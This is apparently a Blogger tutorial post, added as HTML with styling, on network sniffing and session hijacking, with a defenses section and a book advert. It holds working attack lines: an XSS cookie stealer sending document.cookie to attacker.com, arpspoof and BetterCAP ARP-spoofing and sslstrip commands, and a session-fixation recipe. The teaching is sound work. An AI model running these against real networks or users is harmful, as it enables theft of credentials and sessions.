@@ -1,0 +1,795 @@
+<!-- ===== SNIFFING & SESSION HIJACKING GUIDE - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
+<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+
+<style>
+    /* ===== FULL SCREEN WRAPPER ===== */
+    .cyber-post-wrapper {
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0 !important;
+        padding: 30px 40px 50px !important;
+        background: #000000 !important;
+        color: #ffffff;
+        border-radius: 0 !important;
+        box-sizing: border-box;
+        min-height: 100vh;
+    }
+    
+    @media (max-width: 1200px) {
+        .cyber-post-wrapper { padding: 25px 35px 45px !important; }
+    }
+    @media (max-width: 992px) {
+        .cyber-post-wrapper { padding: 22px 30px 40px !important; }
+    }
+    @media (max-width: 768px) {
+        .cyber-post-wrapper { padding: 18px 22px 35px !important; }
+    }
+    @media (max-width: 600px) {
+        .cyber-post-wrapper { padding: 15px 18px 30px !important; }
+    }
+    @media (max-width: 480px) {
+        .cyber-post-wrapper { padding: 12px 14px 25px !important; }
+    }
+    
+    .cyber-content {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 0;
+    }
+    
+    /* ===== POST HEADER ===== */
+    .post-header-cyber {
+        margin-bottom: 35px;
+        padding-bottom: 25px;
+        border-bottom: 2px solid rgba(0, 255, 136, 0.1);
+        text-align: center;
+    }
+    
+    .post-badge {
+        display: inline-block;
+        padding: 6px 26px;
+        background: rgba(0, 255, 136, 0.08);
+        border: 1px solid #ff6b6b;
+        border-radius: 50px;
+        color: #ff6b6b;
+        font-size: 13px;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        margin-bottom: 20px;
+    }
+    
+    .post-title-cyber {
+        font-size: 38px;
+        font-weight: 900;
+        line-height: 1.15;
+        color: #ffffff !important;
+        margin: 12px 0 18px;
+        letter-spacing: -0.5px;
+        text-align: center;
+    }
+    
+    .post-title-cyber strong {
+        color: #ff6b6b;
+    }
+    
+    .post-description {
+        color: #b0b8c8;
+        font-size: 17px;
+        line-height: 1.8;
+        max-width: 700px;
+        margin: 0 auto;
+        text-align: center;
+    }
+    
+    @media (max-width: 992px) {
+        .post-title-cyber { font-size: 30px; }
+    }
+    @media (max-width: 768px) {
+        .post-title-cyber { font-size: 24px; }
+        .post-description { font-size: 15px; }
+    }
+    @media (max-width: 480px) {
+        .post-title-cyber { font-size: 20px; }
+    }
+    
+    /* ===== HEADINGS ===== */
+    .cyber-post-wrapper h2 {
+        color: #ffffff !important;
+        font-size: 26px;
+        font-weight: 800;
+        margin-top: 40px;
+        margin-bottom: 16px;
+        border-left: 5px solid #ff6b6b;
+        padding-left: 18px;
+        line-height: 1.3;
+    }
+    
+    .cyber-post-wrapper h3 {
+        color: #ff6b6b !important;
+        font-size: 20px;
+        font-weight: 700;
+        margin: 25px 0 12px;
+    }
+    
+    .cyber-post-wrapper h4 {
+        color: #ffcc00 !important;
+        font-size: 17px;
+        font-weight: 700;
+        margin: 20px 0 10px;
+    }
+    
+    @media (max-width: 768px) {
+        .cyber-post-wrapper h2 { font-size: 22px; padding-left: 14px; }
+        .cyber-post-wrapper h3 { font-size: 18px; }
+        .cyber-post-wrapper h4 { font-size: 15px; }
+    }
+    @media (max-width: 480px) {
+        .cyber-post-wrapper h2 { font-size: 19px; padding-left: 12px; margin-top: 30px; }
+        .cyber-post-wrapper h3 { font-size: 16px; }
+        .cyber-post-wrapper h4 { font-size: 14px; }
+    }
+    
+    /* ===== PARAGRAPHS ===== */
+    .cyber-post-wrapper p {
+        color: #b0b8c8 !important;
+        font-size: 17px;
+        line-height: 1.9;
+        margin: 14px 0 18px;
+    }
+    .cyber-post-wrapper p strong { color: #ff6b6b; }
+    @media (max-width: 768px) { .cyber-post-wrapper p { font-size: 16px; line-height: 1.8; } }
+    @media (max-width: 480px) { .cyber-post-wrapper p { font-size: 15px; line-height: 1.7; margin: 12px 0 14px; } }
+    
+    /* ===== LISTS ===== */
+    .cyber-post-wrapper ul, .cyber-post-wrapper ol {
+        color: #b0b8c8 !important;
+        font-size: 16px;
+        line-height: 2.2;
+        padding-left: 0;
+        margin: 12px 0 18px;
+        list-style: none;
+    }
+    .cyber-post-wrapper ul li, .cyber-post-wrapper ol li {
+        color: #b0b8c8 !important;
+        margin-bottom: 3px;
+        padding-left: 26px;
+        position: relative;
+    }
+    .cyber-post-wrapper ul li::before {
+        content: "▸";
+        color: #ff6b6b;
+        position: absolute;
+        left: 0;
+        font-weight: 700;
+        font-size: 16px;
+    }
+    .cyber-post-wrapper ol {
+        counter-reset: item;
+    }
+    .cyber-post-wrapper ol li {
+        counter-increment: item;
+        padding-left: 32px;
+    }
+    .cyber-post-wrapper ol li::before {
+        content: counter(item) ".";
+        color: #ff6b6b;
+        position: absolute;
+        left: 0;
+        font-weight: 700;
+        font-size: 15px;
+    }
+    @media (max-width: 480px) {
+        .cyber-post-wrapper ul, .cyber-post-wrapper ol { font-size: 15px; line-height: 2; }
+        .cyber-post-wrapper ul li { padding-left: 22px; }
+        .cyber-post-wrapper ol li { padding-left: 28px; }
+    }
+    
+    /* ===== CODE BLOCKS ===== */
+    .code-block {
+        margin: 12px 0 20px;
+        border-radius: 10px;
+        overflow: hidden;
+        background: #0a0a0a;
+        border: 1px solid rgba(0, 255, 136, 0.06);
+    }
+    .code-header {
+        background: #0d0d0d;
+        padding: 8px 18px;
+        border-bottom: 1px solid rgba(0, 255, 136, 0.05);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 6px;
+    }
+    .code-header span:first-child {
+        color: #ff6b6b;
+        font-size: 13px;
+        font-weight: 600;
+    }
+    .code-header span:last-child {
+        color: #6a7290;
+        font-size: 11px;
+    }
+    .code-block pre {
+        background: #000000;
+        padding: 18px 22px;
+        border-radius: 0;
+        overflow-x: auto;
+        margin: 0;
+        border: none;
+    }
+    .code-block pre code {
+        color: #b0b8c8;
+        font-family: 'Courier New', monospace;
+        font-size: 14px;
+        line-height: 1.8;
+        background: transparent;
+        white-space: pre-wrap;
+        word-break: break-all;
+    }
+    .code-block pre code .cmd { color: #00ff88; }
+    .code-block pre code .flag { color: #ffcc00; }
+    .code-block pre code .target { color: #00d9ff; }
+    .code-block pre code .comment { color: #6a7290; font-style: italic; }
+    .code-block pre code .var { color: #ff6b6b; }
+    .code-block pre code .string { color: #00d9ff; }
+    @media (max-width: 480px) {
+        .code-block pre { padding: 14px 14px; }
+        .code-block pre code { font-size: 12px; line-height: 1.7; }
+        .code-header { padding: 6px 14px; }
+        .code-header span:first-child { font-size: 12px; }
+    }
+    
+    /* ===== TABLE ===== */
+    .cyber-post-wrapper table {
+        width: 100%;
+        border-collapse: collapse;
+        background: #0a0a0a;
+        border-radius: 12px;
+        overflow: hidden;
+        border: 1px solid rgba(0, 255, 136, 0.06);
+        margin: 15px 0 22px;
+        font-size: 14px;
+    }
+    .cyber-post-wrapper table thead tr { background: #ff6b6b; }
+    .cyber-post-wrapper table thead tr th {
+        padding: 12px 18px;
+        text-align: left;
+        font-weight: 700;
+        font-size: 14px;
+        color: #000000;
+    }
+    .cyber-post-wrapper table tbody tr { border-bottom: 1px solid rgba(0, 255, 136, 0.03); }
+    .cyber-post-wrapper table tbody tr:last-child { border-bottom: none; }
+    .cyber-post-wrapper table tbody tr td {
+        padding: 10px 18px;
+        color: #b0b8c8;
+        font-size: 14px;
+    }
+    @media (max-width: 768px) {
+        .cyber-post-wrapper table { font-size: 13px; }
+        .cyber-post-wrapper table thead tr th { padding: 8px 12px; font-size: 12px; }
+        .cyber-post-wrapper table tbody tr td { padding: 8px 12px; font-size: 12px; }
+    }
+    @media (max-width: 480px) {
+        .cyber-post-wrapper table { font-size: 12px; }
+        .cyber-post-wrapper table thead tr th { padding: 6px 10px; font-size: 11px; }
+        .cyber-post-wrapper table tbody tr td { padding: 6px 10px; font-size: 11px; }
+    }
+    
+    /* ===== FEATURED BOX ===== */
+    .featured-box {
+        display: flex;
+        flex-wrap: wrap;
+        align-items: center;
+        gap: 25px;
+        background: #0a0a0a;
+        border: 1px solid rgba(0, 255, 136, 0.08);
+        border-radius: 14px;
+        padding: 22px 28px;
+        margin: 20px 0 30px;
+        justify-content: center;
+    }
+    .featured-box .featured-image img {
+        max-width: 160px;
+        height: auto;
+        border-radius: 12px;
+        border: 2px solid #ff6b6b;
+        transition: 0.3s;
+    }
+    .featured-box .featured-image img:hover {
+        transform: scale(1.03);
+        box-shadow: 0 0 30px rgba(255, 107, 107, 0.15);
+    }
+    .featured-box .featured-cta { flex: 1; text-align: center; }
+    .featured-box .featured-cta p { color: #b0b8c8 !important; margin: 5px 0 10px !important; font-size: 15px; }
+    .featured-box .featured-cta .btn {
+        display: inline-block;
+        padding: 10px 30px;
+        border-radius: 8px;
+        background: linear-gradient(135deg, #ff6b6b, #cc0000);
+        color: #000000;
+        font-weight: 700;
+        font-size: 14px;
+        text-decoration: none;
+        transition: 0.3s;
+    }
+    .featured-box .featured-cta .btn:hover {
+        transform: scale(1.04);
+        box-shadow: 0 0 30px rgba(255, 107, 107, 0.2);
+    }
+    .featured-box .price-tag {
+        display: inline-block;
+        padding: 3px 16px;
+        border-radius: 50px;
+        background: rgba(255, 204, 0, 0.1);
+        border: 1px solid #ffcc00;
+        color: #ffcc00;
+        font-size: 13px;
+        font-weight: 700;
+        margin-top: 5px;
+    }
+    @media (max-width: 600px) {
+        .featured-box { flex-direction: column; text-align: center; padding: 18px; }
+        .featured-box .featured-image img { max-width: 140px; }
+        .featured-box .featured-cta .btn { width: 100%; }
+    }
+    
+    /* ===== DEFENSE BOX ===== */
+    .defense-box {
+        background: rgba(0, 255, 136, 0.03);
+        border: 1px solid rgba(0, 255, 136, 0.08);
+        border-radius: 12px;
+        padding: 18px 24px;
+        margin: 16px 0 22px;
+    }
+    .defense-box p {
+        color: #b0b8c8 !important;
+        font-size: 15px;
+        margin: 4px 0 !important;
+    }
+    .defense-box .check { color: #00ff88; font-weight: 700; }
+    @media (max-width: 480px) {
+        .defense-box { padding: 14px 16px; }
+        .defense-box p { font-size: 14px; }
+    }
+    
+    /* ===== TIP BOX ===== */
+    .tip-box {
+        background: rgba(255, 204, 0, 0.03);
+        border-left: 4px solid #ffcc00;
+        padding: 16px 22px;
+        margin: 16px 0 22px;
+        border-radius: 0 10px 10px 0;
+    }
+    .tip-box p { color: #ffcc00 !important; font-size: 15px; margin: 0 !important; }
+    @media (max-width: 480px) {
+        .tip-box { padding: 14px 16px; }
+        .tip-box p { font-size: 13.5px; }
+    }
+    
+    /* ===== HORIZONTAL RULE ===== */
+    .cyber-post-wrapper hr {
+        border: none;
+        border-top: 1px solid rgba(0, 255, 136, 0.06);
+        margin: 30px 0 32px;
+        background: transparent;
+        height: 1px;
+    }
+    
+    /* ===== SHARE SECTION ===== */
+    .share-section {
+        margin-top: 50px;
+        padding-top: 30px;
+        border-top: 1px solid rgba(0, 255, 136, 0.08);
+    }
+    .share-section p {
+        color: #6a7290 !important;
+        font-size: 15px;
+        text-align: center;
+        margin-bottom: 16px !important;
+    }
+    .share-buttons {
+        display: flex;
+        gap: 16px;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+    .share-buttons a {
+        padding: 12px 28px;
+        border: 1px solid rgba(0, 255, 136, 0.12);
+        border-radius: 10px;
+        color: #b0b8c8 !important;
+        text-decoration: none;
+        font-size: 15px;
+        font-weight: 500;
+        transition: 0.3s;
+        background: transparent;
+    }
+    .share-buttons a:hover {
+        border-color: #ff6b6b;
+        color: #ff6b6b !important;
+        background: rgba(255, 107, 107, 0.04);
+        transform: translateY(-2px);
+    }
+    @media (max-width: 480px) {
+        .share-buttons a { padding: 10px 18px; font-size: 13px; }
+        .share-section { margin-top: 35px; padding-top: 22px; }
+    }
+    
+    /* ===== BLOGGER OVERRIDES ===== */
+    .blog-posts { max-width: 100% !important; padding: 0 !important; }
+    .post-body { padding: 0 !important; background: #000000 !important; }
+    .post-body-content { background: #000000 !important; padding: 0 !important; }
+    .post-outer { background: #000000 !important; padding: 0 !important; margin: 0 !important; border: none !important; box-shadow: none !important; }
+    .post { background: #000000 !important; padding: 0 !important; margin: 0 !important; border: none !important; box-shadow: none !important; }
+    
+    /* ===== LINK STYLES ===== */
+    .cyber-post-wrapper a { color: #ff6b6b; text-decoration: none; transition: 0.3s; }
+    .cyber-post-wrapper a:hover { color: #ff8888; text-decoration: underline; }
+    .text-center { text-align: center; }
+</style>
+
+<!-- ===== MAIN CONTENT ===== -->
+<div class="cyber-post-wrapper">
+
+    <div class="cyber-content">
+
+        <!-- ===== POST HEADER ===== -->
+        <div class="post-header-cyber">
+            <div class="post-badge">👁️ Sniffing & Hijacking</div>
+            <h1 class="post-title-cyber">Sniffing &amp; Session <strong>Hijacking Guide</strong></h1>
+            <p class="post-description">
+                Complete guide to network sniffing, session hijacking techniques, tools, and defenses.
+            </p>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- INTRODUCTION -->
+        <!-- ============================================================ -->
+        <h2>Introduction</h2>
+
+        <p>
+            Sniffing and session hijacking are critical network attacks where an attacker intercepts and manipulates network traffic to steal sensitive data or take over authenticated sessions. This guide covers <strong>techniques, tools, and defenses</strong>.
+        </p>
+
+        <div class="featured-box">
+            <div class="featured-image">
+                <a href="https://www.amazon.com/dp/B0GTYGBHF5" target="_blank">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZyoP_fnwLHN4AG6rY-UyD-atAV0LM2iG28sJIA6SkO0rYbMotKp7RME1fsqDDZu25S6GMbpbFqo64r2RnklmEvuLHb3o6X2soCsbRUGVXRWZNk_9OZ028nwM7w6h4BnHbPKWPai0_90Nza7gqP-RAwO3eS6UVLPgHOh9F7pmslme9cLdlayDli7fKSe0N/s320/image.png" alt="Sniffing Book"/>
+                </a>
+               
+            </div>
+            <div class="featured-cta">
+                <p>📚 <strong style="color:#ff6b6b;">Get Your Copy Today!</strong></p>
+                <a class="btn" href="https://www.amazon.com/dp/B0GTYGBHF5" target="_blank">🛒 Buy Now on Amazon</a>
+            </div>
+        </div>
+
+        <hr/>
+
+        <!-- ============================================================ -->
+        <!-- NETWORK SNIFFING -->
+        <!-- ============================================================ -->
+        <h2>1. Network Sniffing</h2>
+
+        <h3>What is Sniffing?</h3>
+        <ul>
+            <li>Capturing and analyzing network traffic.</li>
+            <li>Used for <strong>passive reconnaissance</strong> (e.g., stealing passwords, cookies).</li>
+            <li>Works on unencrypted (HTTP, FTP, Telnet) and weakly encrypted protocols.</li>
+        </ul>
+
+        <h3>Types of Sniffing</h3>
+
+        <h4>1. Passive Sniffing</h4>
+        <ul>
+            <li>Works on hubs (broadcast traffic).</li>
+            <li>Attacker silently captures packets.</li>
+        </ul>
+
+        <h4>2. Active Sniffing</h4>
+        <ul>
+            <li>Works on switched networks (requires ARP spoofing).</li>
+            <li><strong>Techniques:</strong> ARP Poisoning, MAC Flooding, DNS Spoofing.</li>
+        </ul>
+
+        <h3>Sniffing Tools</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Tool</th>
+                    <th>Purpose</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Wireshark</td>
+                    <td>GUI-based packet analyzer</td>
+                </tr>
+                <tr>
+                    <td>Tcpdump</td>
+                    <td>Command-line packet capture</td>
+                </tr>
+                <tr>
+                    <td>Ettercap</td>
+                    <td>MITM (Man-in-the-Middle) attacks</td>
+                </tr>
+                <tr>
+                    <td>BetterCAP</td>
+                    <td>Advanced MITM framework</td>
+                </tr>
+                <tr>
+                    <td>dsniff</td>
+                    <td>Password sniffing</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>How to Perform Sniffing?</h3>
+
+        <p><strong>Step 1: Set Up Promiscuous Mode</strong></p>
+        <div class="code-block">
+            <div class="code-header">
+                <span>💻 Terminal</span>
+                <span>Promiscuous Mode</span>
+            </div>
+            <pre><code><span class="cmd">ifconfig eth0 promisc</span>  <span class="comment"># Enable promiscuous mode</span></code></pre>
+        </div>
+
+        <p><strong>Step 2: Capture Traffic with Wireshark</strong></p>
+        <ul>
+            <li>Open Wireshark → Select interface → Start capture.</li>
+            <li>Apply filters (e.g., <code>http</code>, <code>ftp</code>, <code>tcp.port == 80</code>).</li>
+        </ul>
+
+        <p><strong>Step 3: Analyze Packets</strong></p>
+        <ul>
+            <li>Look for plaintext passwords (HTTP, FTP).</li>
+            <li>Extract cookies (<code>Cookie:</code> header in HTTP).</li>
+        </ul>
+
+        <hr/>
+
+        <!-- ============================================================ -->
+        <!-- SESSION HIJACKING -->
+        <!-- ============================================================ -->
+        <h2>2. Session Hijacking</h2>
+
+        <h3>What is Session Hijacking?</h3>
+        <ul>
+            <li>Stealing a valid session token (cookie, session ID) to impersonate a user.</li>
+            <li>Common targets: Web apps, SSH, RDP, Telnet.</li>
+        </ul>
+
+        <h3>Types of Session Hijacking</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Method</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Predictable Session Tokens</td>
+                    <td>Guessing weak session IDs</td>
+                </tr>
+                <tr>
+                    <td>Session Sidejacking</td>
+                    <td>Sniffing unencrypted cookies</td>
+                </tr>
+                <tr>
+                    <td>Session Fixation</td>
+                    <td>Forcing a victim to use attacker's session ID</td>
+                </tr>
+                <tr>
+                    <td>Cross-Site Scripting (XSS)</td>
+                    <td>Stealing cookies via JavaScript</td>
+                </tr>
+                <tr>
+                    <td>Man-in-the-Middle (MITM)</td>
+                    <td>Intercepting and modifying traffic</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Session Hijacking Tools</h3>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Tool</th>
+                    <th>Purpose</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Burp Suite</td>
+                    <td>Intercepting &amp; modifying HTTP sessions</td>
+                </tr>
+                <tr>
+                    <td>ZAP (OWASP)</td>
+                    <td>Web app session hijacking</td>
+                </tr>
+                <tr>
+                    <td>Ferret</td>
+                    <td>Cookie hijacking tool</td>
+                </tr>
+                <tr>
+                    <td>Hamster</td>
+                    <td>Sidejacking tool (with Ferret)</td>
+                </tr>
+                <tr>
+                    <td>Ettercap</td>
+                    <td>MITM-based session hijacking</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>How to Perform Session Hijacking?</h3>
+
+        <h4>Method 1: Cookie Theft via XSS</h4>
+        <p><strong>1. Inject malicious script:</strong></p>
+        <div class="code-block">
+            <div class="code-header">
+                <span>📜 JavaScript</span>
+                <span>XSS Cookie Stealer</span>
+            </div>
+            <pre><code><span class="cmd">document.location='http://attacker.com/steal.php?cookie='+document.cookie;</span></code></pre>
+        </div>
+
+        <p><strong>2. Capture stolen cookie</strong> on attacker's server (<code>steal.php</code> logs cookies).</p>
+
+        <h4>Method 2: ARP Spoofing + Cookie Sniffing</h4>
+        <p><strong>1. ARP Poisoning (redirect traffic to attacker):</strong></p>
+        <div class="code-block">
+            <div class="code-header">
+                <span>💻 Terminal</span>
+                <span>ARP Spoofing</span>
+            </div>
+            <pre><code><span class="cmd">arpspoof -i eth0 -t 192.168.1.100 192.168.1.1</span></code></pre>
+        </div>
+
+        <ol start="2">
+            <li>Use Wireshark or Ettercap to sniff cookies.</li>
+            <li>Modify browser cookies (Chrome DevTools → Application → Cookies).</li>
+        </ol>
+
+        <h4>Method 3: Session Fixation</h4>
+        <ol>
+            <li>Generate a fake session ID (<code>PHPSESSID=attacker123</code>).</li>
+            <li>Trick victim into using it (via phishing).</li>
+            <li>When victim logs in, attacker reuses the same session.</li>
+        </ol>
+
+        <hr/>
+
+        <!-- ============================================================ -->
+        <!-- DEFENSES -->
+        <!-- ============================================================ -->
+        <h2>3. Defenses Against Sniffing &amp; Hijacking</h2>
+
+        <h3>Preventing Sniffing</h3>
+        <div class="defense-box">
+            <p><span class="check">✔</span> Encrypt traffic (<strong>HTTPS, SSH, VPN</strong>)</p>
+            <p><span class="check">✔</span> Disable unused protocols (Telnet, FTP)</p>
+            <p><span class="check">✔</span> Use ARP spoofing detection (ARPWatch, XArp)</p>
+            <p><span class="check">✔</span> Network segmentation (VLANs, firewalls)</p>
+        </div>
+
+        <h3>Preventing Session Hijacking</h3>
+        <div class="defense-box">
+            <p><span class="check">✔</span> Use <strong>HTTPS (SSL/TLS)</strong> for all web traffic</p>
+            <p><span class="check">✔</span> Secure cookies (<strong>HttpOnly</strong>, <strong>Secure</strong>, <strong>SameSite</strong> flags)</p>
+            <p><span class="check">✔</span> <strong>Regenerate session IDs</strong> after login</p>
+            <p><span class="check">✔</span> Implement <strong>CSRF tokens</strong></p>
+            <p><span class="check">✔</span> Monitor abnormal logins (IP changes, multiple sessions)</p>
+        </div>
+
+        <hr/>
+
+        <!-- ============================================================ -->
+        <!-- HANDS-ON LAB -->
+        <!-- ============================================================ -->
+        <h2>4. Hands-On Lab</h2>
+
+        <h3>Lab: Stealing Cookies with BetterCAP</h3>
+
+        <p><strong>1. Install BetterCAP:</strong></p>
+        <div class="code-block">
+            <div class="code-header">
+                <span>💻 Terminal</span>
+                <span>Install BetterCAP</span>
+            </div>
+            <pre><code><span class="cmd">sudo apt install bettercap</span></code></pre>
+        </div>
+
+        <p><strong>2. Start ARP spoofing:</strong></p>
+        <div class="code-block">
+            <div class="code-header">
+                <span>💻 Terminal</span>
+                <span>BetterCAP</span>
+            </div>
+            <pre><code><span class="cmd">sudo bettercap -iface eth0</span>
+<span class="cmd">> net.probe on</span>
+<span class="cmd">> net.recon on</span>
+<span class="cmd">> arp.spoof on</span></code></pre>
+        </div>
+
+        <p><strong>3. Sniff HTTP traffic:</strong></p>
+        <div class="code-block">
+            <div class="code-header">
+                <span>💻 Terminal</span>
+                <span>HTTP Sniffing</span>
+            </div>
+            <pre><code><span class="cmd">> set http.proxy.sslstrip true</span>
+<span class="cmd">> http.proxy on</span></code></pre>
+        </div>
+
+        <p><strong>4. Analyze stolen cookies in BetterCAP logs.</strong></p>
+
+        <ol>
+            <li><strong>Search logs</strong> for <code>Cookie:</code> or <code>Set-Cookie:</code> headers.</li>
+            <li><strong>Extract session tokens</strong> (e.g., <code>PHPSESSID</code>, <code>JSESSIONID</code>).</li>
+            <li><strong>Check for missing security flags</strong> (<code>Secure</code>, <code>HttpOnly</code>).</li>
+            <li><strong>Test cookie validity</strong> via <code>curl</code> or Burp Suite.</li>
+            <li><strong>Recommend HTTPS, secure flags, and HSTS</strong> to prevent future theft.</li>
+        </ol>
+
+        <div class="tip-box">
+            <p>💡 Stolen cookies enable session hijacking if unprotected.</p>
+        </div>
+
+       
+
+        <hr/>
+
+        <!-- ============================================================ -->
+        <!-- CONCLUSION -->
+        <!-- ============================================================ -->
+        <h2>Conclusion</h2>
+
+        <ul>
+            <li><strong>Sniffing</strong> = Capturing unencrypted traffic.</li>
+            <li><strong>Session Hijacking</strong> = Stealing active sessions.</li>
+            <li><strong>Defenses</strong> = Encryption, secure cookies, monitoring.</li>
+        </ul>
+
+        <h3>🔹 Next Steps</h3>
+
+        <ul>
+            <li><a href="https://www.cybersume.xyz/2025/03/web-application-hacking.html" target="_blank"><strong>Module 7: Web Application Hacking</strong></a></li>
+            <li>Try HTTPS decryption (SSLstrip, mitmproxy)</li>
+            <li>Explore browser security (CSP, HSTS)</li>
+            <li>Practice on CTF challenges (Hack The Box, TryHackMe)</li>
+        </ul>
+
+        <div class="tip-box">
+            <p>🚀 Would you like a <strong>step-by-step demo on intercepting an SSH session</strong>?</p>
+        </div>
+
+        <hr/>
+
+        <!-- ===== SHARE SECTION ===== -->
+        <div class="share-section">
+            <p>📤 Share this sniffing & session hijacking guide with your network</p>
+            <div class="share-buttons">
+                <a href="#" onclick="window.open('https://twitter.com/intent/tweet?text=Sniffing%20%26%20Session%20Hijacking%20Complete%20Guide%20-%20Master%20Network%20Attacks%20and%20Defense!%20%23Sniffing%20%23SessionHijacking%20%23CyberSecurity','_blank');return false;">
+                 🐦 Twitter
+                </a>
+                <a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(window.location.href),'_blank');return false;">
+                    📘 Facebook
+                </a>
+                <a href="#" onclick="window.open('https://www.linkedin.com/sharing/share-offsite/?url='+encodeURIComponent(window.location.href),'_blank');return false;">
+                    💼 LinkedIn
+                </a>
+            </div>
+        </div>
+
+    </div>
+
+</div>           
